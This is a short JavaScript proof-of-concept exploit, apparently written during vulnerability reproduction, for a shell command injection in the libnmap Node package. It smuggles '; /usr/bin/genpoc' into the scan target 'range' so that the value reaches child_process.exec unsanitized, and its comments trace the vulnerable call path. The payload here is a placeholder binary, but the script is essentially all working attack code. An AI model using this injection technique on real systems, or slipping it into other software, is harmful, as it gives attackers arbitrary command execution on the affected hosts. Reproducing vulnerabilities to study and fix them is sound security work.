```javascript
async function exploit() {
    const libnmap = require('libnmap');

    // The 'range' parameter (representing target hosts/networks) is directly interpolated into the shell command 
    // string by lib/classes/tools.js#command without any sanitization or validation against shell metacharacters.
    // Injecting '; /usr/bin/genpoc' terminates the intended nmap execution and chains our arbitrary payload.
    const maliciousTarget = '127.0.0.1; /usr/bin/genpoc';

    const opts = {
        range: [maliciousTarget],
        flags: ['-sn', '-oX -'],
        udp: false,
        timeout: 5,
        nmap: '/usr/bin/nmap'
    };

    // In libnmap v0.4.x, the package entry point exports a constructor Class directly rather than a factory function.
    // The previous execution crashed because .create() was removed/renamed during the stream-object migration (v0.4.16 context).
    // Instantiating it correctly initializes internal configuration and exposes the .scan() method.
    const client = new libnmap({ timeout: 60 });

    // Calling .scan(opts) internally delegates to: tools.init() -> network.calculate() -> tools.funcs() -> proc(cmd).
    // This is the exact execution path where unsanitized user input reaches child_process.exec().
    // We deliberately omit try/catch and .catch() so any structural or runtime failures propagate visibly as requested.
    client.scan(opts, (err, results) => {
        if (err) {
            console.error('[-] Scan failed:', err.message || err);
        } else {
            console.log('[+] PoC Success: Command injection triggered.');
        }
    });

    // Provide a window for the asynchronous child_process to spawn and execute the injected malicious payload.
    await new Promise(resolve => setTimeout(resolve, 3000));
}

await exploit();
